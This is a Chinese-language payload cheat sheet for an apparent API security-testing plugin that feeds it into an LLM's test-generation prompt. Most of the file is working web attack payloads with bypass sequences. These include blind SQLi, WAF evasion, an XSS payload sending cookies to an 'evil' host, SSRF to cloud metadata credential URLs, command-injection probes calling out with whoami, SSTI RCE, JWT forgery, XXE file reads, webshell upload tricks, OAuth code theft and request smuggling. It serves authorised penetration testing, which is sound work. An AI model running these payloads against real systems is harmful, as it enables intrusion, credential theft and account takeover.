# API Sentinel Payload 参考库

<!-- 蒸馏自 shuvonsec/claude-bug-bounty (MIT License) 的 security-arsenal/SKILL.md
     与 web2-vuln-classes/SKILL.md，仅为公开公认的决策框架/检测串（完整借鉴登记
     见 docs/THIRD-PARTY.md）。设计哲学：LLM 自己会写 payload，本库教的是
     "什么场景测什么、失败后怎么继续"——基础 payload 示例已移除。
     本文件由 TestGenPrompt.buildUserPrompt() 按 Stage1 findings 命中的漏洞类型
     按需拼接注入；注入上限由 buildPayloadReference() 控制（每节 1200 / 单次 3000）。 -->

## SQLi
盲注函数按 DB 选择（确认注入点后）：
- MySQL：`' AND SLEEP(5)-- -`、`' AND BENCHMARK(5000000,MD5(1))-- -`
- PostgreSQL：`'; SELECT pg_sleep(5)-- -`
- MSSQL：`'; WAITFOR DELAY '0:0:5'-- -`
- Oracle：`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -`
- SQLite：`' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -`
DB 指纹（从报错推断类型再选函数）：
- MySQL："You have an error in your SQL syntax"、information_schema
- MSSQL："Unclosed quotation mark"、sysobjects、@@version 含 Microsoft
- Oracle：ORA- 前缀、v$version、rownum
- PostgreSQL："syntax error at or near"、pg_sleep
- SQLite：near "...": syntax error、SQLITE_ 前缀
Union 定列数：`' UNION SELECT NULL-- -` 递增列数直到不再报错
WAF 绕过决策路径（被拦截后按序尝试，成功即停）：
1. 大小写混用（UnIoN sElEcT）→ 2. 注释混淆（`/**/`、`#`、`;%00`）→ 3. 多层编码（%27→%2527）→ 4. 等价替换（OR→||、=→LIKE）→ 5. 放弃并标注"WAF 防护有效"

## XSS
决策要点：
- 有 CSP：先看策略是否允许 inline/unsafe-inline/可控域名，不可绕 → 降级信息级（不报）
- 按反射上下文选载荷：属性上下文先闭合属性（`" onfocus=alert(1) autofocus=`）；HTML 上下文用事件处理器（`<img src=x onerror=>`/`<svg onload=>`）；JS 上下文需字符串逃逸
- 关键字被过滤：base64 包装 `<script>eval(atob('YWxlcnQoMSk='))</script>`
- DOM XSS：找前端 source（location/hash/postMessage）→ sink（innerHTML/eval/document.write）链路

## SSRF
云元数据（确认能请求内网后）：
- AWS：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`（再加 /角色名 拿凭证）
- GCP：`http://metadata.google.internal/computeMetadata/v1/`（需头 `Metadata-Flavor: Google`）
- Azure：`http://169.254.169.254/metadata/instance?api-version=2021-02-01`（需头 `Metadata: true`）
- 阿里云：`http://100.100.100.200/latest/meta-data/`
127.0.0.1 被拦时 IP 变体（按序尝试）：
1. 十进制 `2130706433` 2. 十六进制 `0x7f.0.0.1` 3. IPv6 `[::1]`/`[::ffff:127.0.0.1]` 4. 缩写 `127.1` 5. DNS `127.0.0.1.nip.io` 6. 302 重定向（自有域名挂 302 指向内网，绕"只校验首跳"）
gopher/file 协议（看后端是否支持）

## NoSQL
操作符注入（JSON body）：`{"user":{"$ne":null},"pass":{"$ne":null}}`、`{"id":{"$gt":0}}`、`{"name":{"$regex":"^a"}}`、`{"$exists":true}`
GET 编码形态：`username%5B%24ne%5D=null`（`[`=%5B `$`=%24 `]`=%5D）
MongoDB 布尔：`{"$where":"this.username=='admin'&&this.password.charAt(0)=='a'"}`
判定：不可能凭证基线 401/403 → 变体 200 = 绕过；`$where sleep` 延迟 ≥70% = 时序确认

## 路径穿越
编码变体（被拦按序尝试）：`../` → `%2e%2e%2f` → 双重编码 `%252e%252e%252f` → `....//` → Unicode `..%c0%ae`
空字节截断（旧后端）：`../../../etc/passwd%00.png`
目标文件：`/etc/passwd`（Unix）、`C:\Windows\win.ini`（Windows）
判定：返回文件内容 = 确认；仅报错 ≠ 确认

## 命令注入
OOB 确认（盲注首选）：`curl http://探针/$(whoami)`、`nslookup $(id).探针`
空格过滤：`${IFS}`、`$IFS$9`、`<` 重定向（`cat</etc/passwd`）、`{cmd,arg}`
关键字过滤：引号拆分 `c'a't` / 变量拼接 `c${x}t` / base64 `echo aWQ=|base64 -d|sh`
分隔符替换（; 被拦按序）：`|` → `||` → `&&` → 反引号 → `$()` → `%0a`

## SSTI
引擎指纹矩阵（先探针后选 RCE）：
- `{{7*7}}` → 49 = Jinja2 / Twig
- `${7*7}` → 49 = Freemarker / Thymeleaf / Velocity
- `<%= 7*7 %>` → 49 = ERB
- `{7*7}` → 49 = Mako / Pebble
- `#{7*7}` → 49 = Ruby / Pug
探针被拦时切换引擎语法（{{}} → ${} → <%= %> → #{}，WAF 可能只拦一种）
确认引擎后：Jinja2 `{{''.__class__.__mro__[1].__subclasses__()}}` 找 os.popen；Twig `{{_self.env.registerUndefinedFilterCallback("exec")}}`

## IDOR/越权
数字 ID 替换：`/api/users/1001` → `1002`/`1003`（递增/递减）
UUID 替换：从低权账号拿 UUID 替换进目标资源路径
HTTP 方法交换：`GET` → `POST`/`PUT`/`DELETE`（写操作常缺鉴权）
旧 API 版本路径：`/v2/users/{id}` → `/v1/users/{id}`、`/api/internal/users/{id}`
参数污染：`?id=own&id=victim`
隐藏字段猜测：响应 JSON 只读字段（role/isAdmin/balance/verified/user_type）反向提交
判定：替换后仍返回自己数据 = 误报（attacker==victim）；返回他人数据 = 确认

## JWT
alg:none 去签名：header `{"alg":"none","typ":"JWT"}` + base64 payload + 空签名（none/None/NONE/nOnE 变体都试）
HS256 弱口令：`hashcat -m 0 token.txt 字典`；常见：secret/password/key/changeme
kid 参数注入：`{"kid":"../../dev/null"}` 空文件签名 / kid 指向已知文件路径
jku/x5u/jwk header 注入：指向攻击者可控公钥端点
RS256→HS256 混淆：用服务端公钥作 HMAC 密钥重签（需先拿到公钥）

## XXE
经典文件读（XML body）：`<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>`
OOB DNS 确认（blind，复用 SsrfOobTool 探针）：`<!DOCTYPE x [<!ENTITY % d SYSTEM "http://探针/x.dtd">%d;]>`
参数实体读源码：`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/index.php">`

## 高频漏洞参数
WooYun 统计（命中即优先测注入/越权）：
id > __viewstate > sort_id > username > password > name > type > action > page

## 竞态条件
适用：接口有余额/次数/配额/库存语义（提现、领券、下单扣减、限额）
漏洞模式（检查-用间隙）：先查余额再扣减，两步之间有并发窗口；安全写法是条件原子更新
`UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?`（影响行数=0 即拒绝）
近似测法（send_request 无并发引擎时）：对同一状态变更请求连续发送 5 次相同 payload，
检查是否超额扣减/重复领取/配额突破；有条件时用 Turbo Intruder Last-Byte Sync 20 并发
5 类典型目标：优惠码兑换 / 余额礼品卡消费 / 限量抢购 / 限流绕过（计数器自增前发送）/ 邮箱验证 token
kill signal：连续发送后状态未突破即放弃；接口带幂等键（idempotency-key）判安全

## OAuth/OIDC
适用：流量出现 /authorize /token /callback、redirect_uri、state、code_verifier
PKCE 缺失：从 /authorize 请求去掉 code_challenge/code_challenge_method 重放，
仍返回 302 跳转（而非 error）= 未强制 PKCE → 授权码拦截→ATO 风险
state 缺失/静态：OAuth CSRF——攻击者发起授权不确认，把 URL 发给受害者，
受害者授权后其授权码绑定到攻击者会话 → 账号接管
redirect_uri 绕过（开放重定向链，窃取授权码）：
`https://legit.com@evil.com`（@ 符号）· `https://legit.com.evil.com`（子域）·
`%252f%252fevil.com`（双编码）· `https://legit.com\@evil.com`（反斜杠归一化）·
`//evil.com`（协议相对）· `https://legit.com%00.evil.com`（空字节截断）·
IDN 同形字符 · `data:text/html,...`
kill signal：redirect_uri 精确白名单匹配（非前缀/正则）→ 放弃

## 文件上传
扩展名绕过：`shell.php.jpg`（双扩展名）· `shell.jpg.php`（反序）· `shell.php%00.jpg`（空字节）·
大小写 `shell.pHp` · 替扩展名 `.php5/.phtml`
MIME 伪装：Content-Type 改 image/jpeg 但 body 是脚本内容
magic bytes 伪装：脚本内容前加合法文件头 `GIF89a;`（JPEG=FFD8FF / PNG=89504E47 / GIF=47494638 / ZIP=504B0304）
SVG 存储型 XSS：上传 `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`
DOCX XXE：Office 文档是 ZIP，内部 XML 注入外部实体；ZIP slip：压缩包内条目名 `../../../etc/passwd`
multipart 解析混淆（Node/Busboy 重点）：part 加 `charset=utf-16le` 绕过字节级检测 ·
双 boundary 嵌套 · 重复 filename（safe.txt + evil.aspx）· RFC2231 `filename*=utf-8''shell.php`
kill signal：服务端解析完整文件内容+扩展名白名单+重命名为 UUID → 转向测存储型 XSS

## 批量赋值
隐藏字段反向提交：把响应 JSON 里出现的只读字段加回请求体——
`role` `isAdmin` `balance` `verified` `user_type` `is_premium` `permission_level`，
PUT/PATCH 原样提交整个对象，看是否被接受
创建接口：POST 时额外携带权限字段（注册时直接带 `"role":"admin"`）
判定：字段被接受且后续响应/接口行为显示权限或数值变化 → confirmed；字段被忽略 → safe
kill signal：源码显示 DTO/白名单绑定（只取声明字段）→ 放弃

## GraphQL
introspection（开启本身仅信息级，用于侦察攻击面）：
`{ __schema { types { name fields { name type { name } } } } }`
node(id:) 越权读（绕过逐对象鉴权）：`{ node(id: "base64(GID)") { ... on User { email phoneNumber } } }`
aliasing 批量 IDOR：单条查询别名并列多个目标
`{ q1: user(id:1){ email } q2: user(id:2){ email } ... }`
批量数组绕限流：`[{"query":"{ login(email:\"a\",password:\"1\") }"},{"query":"..."}]`
深度 DoS 线索：depth 15 嵌套 edges/node 查询——仅报告无深度限制这一事实，不实际打挂
kill signal：node() 返回 null 或 permission error、introspection 关闭且无字段提示 → 防护有效

## WebSocket
CSWSH（跨站劫持）：跨域页面 `new WebSocket('wss://target/ws')` 浏览器自动带受害者 cookie，
服务端不校验 Origin 即可劫持。测法：握手带 `Origin: https://evil.com` / `null` /
`https://target.com.evil.com`，不拒绝即存在 CSWSH
消息注入（经 WS 消息体）：XSS `{"message":"<img src=x onerror=fetch('https://evil/?c='+document.cookie)>"}` ·
SQLi `{"action":"search","query":"' OR 1=1--"}` · SSRF `{"action":"preview","url":"http://169.254.169.254/latest/meta-data/"}`
注意：本插件不主动建 WS 连接，此节用于生成 PoC 与人工/外部工具验证建议

## 请求走私
⚠ 有破坏性：仅限明确授权目标；探测包返回 400 或正常响应即放弃，不算命中
CL.TE（前端 CL / 后端 TE）：同时带 `Content-Length: 13` 与 `Transfer-Encoding: chunked`，
body 为 `0\r\n\r\nSMUGGLED`（后端等待 → 约 10s 超时 = 命中信号）
TE.CL：`Transfer-Encoding: chunked` + `Content-Length: 3`，body `8\r\nSMUGGLED\r\n0\r\n\r\n`
TE.TE 混淆变体（两层都支持 TE 时让其一失效）：`Transfer-Encoding: xchunked` ·
`Transfer-Encoding:[tab]chunked` · `[space]Transfer-Encoding: chunked` · 头名换行 `Transfer-Encoding\n: chunked`
H2.CL：HTTP/2 下手动添加 Content-Length 头（前端忽略、后端使用 → 去同步）
确认后的影响链：捕获下一个受害者请求 → 读取凭证；+ 缓存投毒 → 存储型 XSS 扩大化
